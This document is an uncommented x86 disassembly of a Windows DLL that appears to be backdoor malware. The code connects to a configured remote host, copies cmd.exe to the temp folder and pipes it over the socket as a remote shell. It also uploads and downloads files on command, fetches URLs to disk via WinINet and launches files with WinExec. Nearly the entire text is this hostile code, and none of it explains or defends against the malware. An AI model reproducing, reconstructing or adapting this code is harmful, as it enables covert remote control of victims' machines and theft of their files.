sub_10001000
sub esp 0x2b0
mov eax [ rw-data ]
mov cx [ rw-data ]
mov dl [ rw-data ]
push ebx
push ebp
push esi
mov esi [ esp + 0x2c0 ]
mov [ esp + 0x10 ] eax
push edi
mov [ esp + 0x10 ] 0x2c00
lea eax [ esi + 0x14 ]
mov [ esp + 0x18 ] cx
push eax
mov [ esp + 0x1e ] dl
mov [ esp + 0x20 ] 0x2
call inet_addr
add esi 0x118
mov [ esp + 0x20 ] eax
push esi
call [ atoi@IAT ]
add esp 0x4
push eax
call htons
mov [ esp + 0x1e ] ax
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2b0
retn
push 0x6
push 0x1
push 0x2
call socket
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
call WSACleanup
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0x1001
push 0xffff
push ebp
call setsockopt
lea eax [ esp + 0x10 ]
push 0x4
push eax
push 0x1002
push 0xffff
push ebp
call setsockopt
xor ebx ebx
mov [ rw-data ] 0x1
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push ebp
call connect
cmp eax 0xffffffff
jne r-xdata
call WSACleanup
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebp
call closesocket
xor eax eax
lea edx [ esp + 0x2c ]
push eax
mov ecx 0x41
lea edi [ esp + 0x30 ]
push 0x104
push edx
push ebp
[ edi ]
call recv
cmp eax 0xffffffff
jne r-xdata
push 0x1f018
inc ebx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1f018
call [ Sleep@IAT ]
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x2c ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp ebx 0x3
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
push eax
call [ Sleep@IAT ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp ebx 0x3
jl r-xdata
lea ecx [ esp + 0x130 ]
mov [ rw-data ] 0x0
push ecx
push 0x202
call WSAStartup
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2b0
retn
push ebp
call sub_10001200
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test ebp ebp
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10001200
sub esp 0x784
mov al [ rw-data ]
push ebx
push esi
push edi
mov [ esp + 0x390 ] al
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x391 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x3c ]
xor ebx ebx
push ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x24 ] 0xc
stosb [ edi ]
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x40 ] 0x44
call [ GetStartupInfoA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x390 ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x798 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov [ esp + 0x70 ] bx
[ edi ] [ esi ]
lea edi [ esp + 0x394 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + 0x6c ] 0x101
push ecx
lea ecx [ esp + 0x398 ]
push ecx
push edx
call send
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x90 ]
push eax
push 0x100
call [ GetTempPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x90 ]
[ edi ]
not ecx
sub edi ecx
push 0x100
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x294 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ GetSystemDirectoryA@IAT ]
push 0x65
push 0x78
push 0x65
push 0x2e
push 0x64
push 0x6d
lea ecx [ esp + 0x2a8 ]
push 0x63
push ecx
lea edx [ esp + 0x1b0 ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x28
lea eax [ esp + 0x90 ]
lea ecx [ esp + 0x190 ]
push ebx
push eax
push ecx
call [ CopyFileA@IAT ]
mov esi [ CreatePipe@IAT ]
lea edx [ esp + 0x20 ]
push ebx
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x14 ]
push eax
push ecx
call esi
lea edx [ esp + 0x20 ]
push ebx
lea eax [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
call esi
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x7c ] eax
mov [ esp + 0x78 ] eax
lea eax [ esp + 0x80 ]
lea ecx [ esp + 0x3c ]
push eax
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x90 ] edx
push ebx
push rw-data
lea edx [ esp + 0xb4 ]
push edx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebx
add esp 0x784
retn
lea edx [ esp + 0x794 ]
mov edi [ CreateThread@IAT ]
mov [ esp + 0x38 ] edx
push ebx
lea edx [ esp + 0x38 ]
lea ecx [ esp + 0x10 ]
push ebx
push edx
mov [ esp + 0x40 ] ecx
push sub_100014a0
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x7a4 ]
push ebx
push ebx
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ecx
mov [ esp + 0x30 ] ebx
call edi
mov esi eax
push ebx
lea eax [ esp + 0x30 ]
push ebx
push eax
push sub_10001540
push ebx
push ebx
call edi
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push esi
call [ GetExitCodeThread@IAT ]
mov edx [ esp + 0x18 ]
push edx
push esi
call [ TerminateThread@IAT ]
push 0x3e8
call [ Sleep@IAT ]
lea eax [ esp + 0x90 ]
push eax
call [ DeleteFileA@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x784
retn
lea eax [ esp + 0x90 ]
mov [ rw-data ] 0x1
push eax
call [ DeleteFileA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x784
retn
sub_100014a0
sub esp 0x5b8
push ebp
mov ebp [ PeekNamedPipe@IAT ]
push esi
mov esi [ esp + 0x5c4 ]
push edi
mov edi [ Sleep@IAT ]
push 0x1
call edi
mov edx [ esi ]
push 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
mov eax [ edx ]
lea ecx [ esp + 0x1c ]
push 0x5b3
push ecx
push eax
call ebp
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push eax
mov eax [ esi ]
lea edx [ esp + 0x1c ]
push edx
mov ecx [ eax ]
push ecx
call [ ReadFile@IAT ]
push 0x0
lea edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push eax
push edx
mov [ esp + eax + 0x1c ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push ecx
call send
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebp
add esp 0x5b8
retn 0x4
sub_10001540
sub esp 0xad8
push ebx
push ebp
mov ebp [ esp + 0xae4 ]
push esi
push edi
mov [ esp + 0x18 ] 0x65
mov [ esp + 0x19 ] 0x78
mov [ esp + 0x1a ] 0x69
mov [ esp + 0x1b ] 0x74
mov [ esp + 0x1c ] 0xd
mov [ esp + 0x1d ] 0xa
xor ebx ebx
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
xor eax eax
pop ebx
add esp 0xad8
retn 0x4
mov al [ esp + 0x17 ]
mov ecx [ esp + 0x10 ]
cmp al 0xa
mov [ esp + ecx + 0x124 ] al
je r-xdata
mov [ esp + ecx + 0x124 ] bl
cmp al 0xd
je r-xdata
push 0x3
lea edx [ esp + 0x128 ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea edi [ esp + 0x127 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x9e4 ]
mov eax ecx
mov esi edi
mov edi edx
push 0xc
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov esi eax
xor ecx ecx
mov edx esi
add esp 0x4
mov [ edx ] ecx
push ebx
push ebx
push esi
mov [ edx + 0x4 ] ecx
push sub_10001a50
push ebx
push ebx
mov [ edx + 0x8 ] ecx
mov eax [ ebp + 0x4 ]
lea ecx [ esp + 0x9fc ]
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
call [ CreateThread@IAT ]
mov edi eax
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
push ebx
push edi
call [ TerminateThread@IAT ]
push esi
call [ free@IAT ]
add esp 0x4
jmp r-xdata
inc ecx
cmp ecx 0x5b4
mov [ esp + 0x10 ] ecx
jb r-xdata
push 0x5
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x6d8 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov esi [ strrchr@IAT ]
lea ecx [ esp + 0x124 ]
push 0x5c
push ecx
call esi
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x10 ] ebx
mov ecx [ ebp + 0x4 ]
push ebx
lea eax [ esp + 0x1b ]
push 0x1
mov edx [ ecx ]
push eax
push edx
call recv
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
mov esi rw-data
lea eax [ esp + 0x124 ]
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x7dc ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x8e0 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
lea edx [ esp + 0x7dc ]
push 0x2f2f
push edx
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x8e8 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x8e8 ]
and ecx 0x3
push ebx
[ edi ] [ esi ]
lea ecx [ esp + 0x7e8 ]
push eax
push ecx
call sub_10001e50
add esp 0x14
test eax eax
je r-xdata
lea edi [ esp + 0x127 ]
lea edx [ esp + 0x124 ]
push 0x5c
push edx
call esi
mov edi eax
add esp 0x8
inc edi
jmp r-xdata
mov esi [ strncmp@IAT ]
push 0x3
lea eax [ esp + 0x128 ]
push rw-data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
lea eax [ esp + 0x20 ]
push rw-data
push eax
lea edx [ esp + 0x20 ]
push rw-data
push edx
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x6d8 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0xc
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov esi eax
xor eax eax
mov ecx esi
add esp 0x4
mov [ ecx ] eax
push ebx
push ebx
push esi
mov [ ecx + 0x4 ] eax
push sub_10001c20
push ebx
push ebx
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x4 ]
lea eax [ esp + 0x6f0 ]
mov [ esi ] edx
mov [ esi + 0x4 ] eax
call [ CreateThread@IAT ]
mov edi eax
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
push ebx
push edi
call [ TerminateThread@IAT ]
push esi
call [ free@IAT ]
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x10 ]
push ebx
push eax
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edx [ ebp ]
not ecx
mov eax [ edx ]
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push ecx
push eax
call [ WriteFile@IAT ]
mov esi [ strncmp@IAT ]
push 0x5
lea eax [ esp + 0x128 ]
push rw-data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
mov [ rw-data ] eax
pop ebx
add esp 0xad8
retn 0x4
mov edx [ ebp ]
lea ecx [ esp + 0x10 ]
push ebx
push ecx
mov eax [ edx ]
push 0x1
push rw-data
push eax
call [ WriteFile@IAT ]
jmp r-xdata
call [ sprintf@IAT ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
mov edx [ ebp + 0x4 ]
push ebx
not ecx
mov eax [ edx ]
dec ecx
push ecx
lea ecx [ esp + 0x28 ]
push ecx
push eax
call send
cmp eax 0xffffffff
je r-xdata
push 0x4
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
lea edx [ esp + 0x18 ]
push 0x4
lea eax [ esp + 0x128 ]
push edx
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
ja r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x124 ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp ]
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x130 ]
push ecx
push eax
call [ WriteFile@IAT ]
jmp r-xdata
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
je r-xdata
lea ecx [ esp + 0x10 ]
push ebx
push ecx
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebp ]
lea edx [ esp + 0x20 ]
not ecx
dec ecx
push ecx
mov ecx [ eax ]
push edx
push ecx
call [ WriteFile@IAT ]
push rw-data
lea edx [ esp + 0x12c ]
push rw-data
push edx
call [ sscanf@IAT ]
add esp 0xc
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
jbe r-xdata
cmp [ esp + 0x128 ] 0x20
je r-xdata
sub_10001a50
sub esp 0xb68
push ebx
mov ebx [ esp + 0xb70 ]
push esi
push edi
mov eax [ ebx + 0x4 ]
push 0x8000
push eax
call [ _open@IAT ]
mov esi eax
add esp 0x8
cmp esi 0xffffffff
jne r-xdata
push ebp
push esi
call [ _filelength@IAT ]
mov ebp eax
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
push ebp
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
mov eax [ ebx ]
push 0x0
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push ecx
mov ecx [ eax ]
push edx
push ecx
call send
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x5c4 ]
push eax
[ edi ]
mov eax [ ebx ]
lea edx [ esp + 0x5c8 ]
push 0x5b4
push edx
mov ecx [ eax ]
push ecx
call recv
lea edx [ esp + 0x5c4 ]
push edx
call [ atoi@IAT ]
mov edi eax
push 0x1
push edi
push esi
call [ _lseek@IAT ]
add esp 0x10
cmp edi ebp
je r-xdata
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0xc ]
lea edx [ esp + 0xc ]
[ edi ]
mov edi rw-data
or ecx esi
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push ecx
push eax
call send
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xb68
retn 0x4
push esi
call [ _close@IAT ]
add esp 0x4
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0xb68
retn 0x4
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x10 ]
push 0x5b4
[ edi ]
lea eax [ esp + 0x14 ]
push eax
push esi
call [ _read@IAT ]
mov edx [ ebx ]
add esp 0xc
lea ecx [ esp + 0x10 ]
push 0x0
push eax
mov eax [ edx ]
push ecx
push eax
call send
cmp eax 0xffffffff
je r-xdata
mov edx [ ebx ]
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x5c4 ]
[ edi ]
push eax
mov eax [ edx ]
lea ecx [ esp + 0x5c8 ]
push 0x5b4
push ecx
push eax
call recv
lea edx [ esp + 0x5c4 ]
mov ecx rw-data
mov ax [ edx ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ esp + 0x5c4 ]
push ecx
call [ atoi@IAT ]
add esp 0x4
mov edi eax
push 0x1
call [ Sleep@IAT ]
cmp edi ebp
jne r-xdata
sub_10001c20
sub esp 0xb70
push ebx
mov ebx [ esp + 0xb78 ]
push edi
push 0x80
mov eax [ ebx + 0x4 ]
push 0x8101
push eax
call [ _open@IAT ]
add esp 0xc
cmp eax 0xffffffff
mov [ esp + 0x8 ] eax
jne r-xdata
push ebp
push esi
push eax
call [ _filelength@IAT ]
mov ebp eax
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x1c ]
push ebp
lea edx [ esp + 0x20 ]
push rw-data
push edx
[ edi ]
call [ sprintf@IAT ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
push 0x0
push ecx
mov ecx [ ebx ]
lea eax [ esp + 0x20 ]
mov edx [ ecx ]
push eax
push edx
call send
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x5cc ]
push eax
[ edi ]
mov ecx [ ebx ]
lea eax [ esp + 0x5d0 ]
push 0x5b4
push eax
mov edx [ ecx ]
push edx
call recv
lea eax [ esp + 0x5cc ]
push eax
call [ atoi@IAT ]
mov [ esp + 0x18 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x4
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
call send
push 0x1
push ebp
mov ecx [ esp + 0x18 ]
mov esi ebp
push ecx
call [ _lseek@IAT ]
mov eax [ esp + 0x20 ]
add esp 0xc
cmp ebp eax
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
mov eax [ ebx ]
push 0x0
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push ecx
mov ecx [ eax ]
push edx
push ecx
call send
pop edi
xor eax eax
pop ebx
add esp 0xb70
retn 0x4
mov edx [ esp + 0x10 ]
push edx
call [ _close@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebp
pop edi
pop ebx
add esp 0xb70
retn 0x4
mov ebp [ _write@IAT ]
lea ecx [ esp + 0x5cc ]
mov edx rw-data
mov cx [ ecx ]
cmp cx [ edx ]
je r-xdata
add esi eax
push eax
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x5d0 ]
push edx
push eax
call ebp
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x24 ]
push esi
[ edi ]
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ ebx ]
push 0x0
not ecx
dec ecx
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ eax ]
push edx
push ecx
call send
push 0x1
call [ Sleep@IAT ]
cmp esi [ esp + 0x14 ]
jne r-xdata
mov ecx 0x16d
xor eax eax
lea edi [ esp + 0x5cc ]
push eax
[ edi ]
mov eax [ ebx ]
lea edx [ esp + 0x5d0 ]
push 0x5b4
push edx
mov ecx [ eax ]
push ecx
call recv
cmp eax 0xffffffff
je r-xdata
sub_10001e50
sub esp 0x208
mov dl [ rw-data ]
push ebx
push ebp
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] dl
[ edi ]
stosw [ edi ]
mov ebx [ strrchr@IAT ]
push 0x2f
stosb [ edi ]
mov edi [ esp + 0x21c ]
push edi
call ebx
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x114 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ebp [ esp + 0x224 ]
mov ecx eax
and ecx 0x3
test ebp ebp
[ edi ] [ esi ]
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x208
retn
mov edi [ esp + 0x220 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov esi [ esp + 0x220 ]
push 0x2e
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
test ebp ebp
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x208
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
push 0x2e
push esi
call ebx
add esp 0x8
sub eax esi
jmp r-xdata
pop edi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn
lea eax [ esp + 0xc ]
push 0x0
push eax
call [ WinExec@IAT ]
cmp eax 0x1f
ja r-xdata
mov [ esp + ecx + 0x10 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx eax
xor ecx ecx
test eax eax
jle r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn
and ecx 0x3
lea edx [ esp + 0x114 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call sub_10001fe0
add esp 0x8
test eax eax
pop esi
jne r-xdata
sub_10001fe0
sub esp 0x44
lea eax [ esp ]
push esi
push 0x0
push eax
call [ InternetGetConnectedState@IAT ]
call [ timeGetTime@IAT ]
push eax
lea ecx [ esp + 0xc ]
push rw-data
push ecx
call [ sprintf@IAT ]
mov al [ esp + 0x10 ]
add esp 0xc
test al 0x4
push 0x0
push 0x0
push 0x0
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x0
push eax
lea edx [ esp + 0x14 ]
push 0x4
push edx
jmp r-xdata
xor eax eax
pop esi
add esp 0x44
retn
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
push edi
push ecx
push edx
push esi
call sub_10002070
add esp 0xc
mov edi eax
push esi
call [ InternetCloseHandle@IAT ]
mov eax edi
pop edi
pop esi
add esp 0x44
retn
call [ InternetOpenA@IAT ]
mov esi eax
test esi esi
je r-xdata
sub_10002070
mov eax 0x1001c
call sub_10002910
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
push 0x0
lea ecx [ esp + 0x20 ]
push 0x84000100
push ecx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] eax
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x10038 ]
push eax
mov eax [ esp + 0x10040 ]
lea edx [ esp + 0x28 ]
push edx
push eax
push ecx
call [ InternetOpenUrlA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea edx [ esp + 0x18 ]
push 0x0
lea eax [ esp + 0x18 ]
push edx
push eax
push 0x20000005
push esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x4
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ecx [ esp + 0x10038 ]
push rw-data
push ecx
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ebx [ InternetReadFile@IAT ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x30 ]
push 0x4000
push eax
push esi
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ebp [ fwrite@IAT ]
call [ fflush@IAT ]
push edi
call [ fclose@IAT ]
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
push eax
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
call ebp
add esp 0x10
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x2c ]
push edx
push 0x4000
push eax
push esi
call ebx
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push edi
test eax eax
je r-xdata
sub_10002200
sub esp 0x314
push ebx
push ebp
push esi
push edi
xor eax eax
push 0x220
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] eax
call [ malloc@IAT ]
mov ebp eax
mov ecx 0x88
xor eax eax
mov edi ebp
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x120 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x120 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x224 ]
push ecx
push edx
call sub_10002750
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp + 0xa ]
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x220 ]
push ebp
push ecx
call sub_10002440
add esp 0x8
cmp eax 0x3
ja r-xdata
jmp [ eax * 4 + jump_table_10002424 ]
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x3
mov [ esp + 0x14 ] eax
jl r-xdata
xor esi esi
push ebp
mov [ esp + 0x18 ] esi
call sub_10001000
add esp 0x4
test eax eax
jne r-xdata
lea edx [ ebp + 0x118 ]
mov [ esp + 0x14 ] 0x0
push edx
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax 0x1b58
push eax
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ esp + 0x18 ]
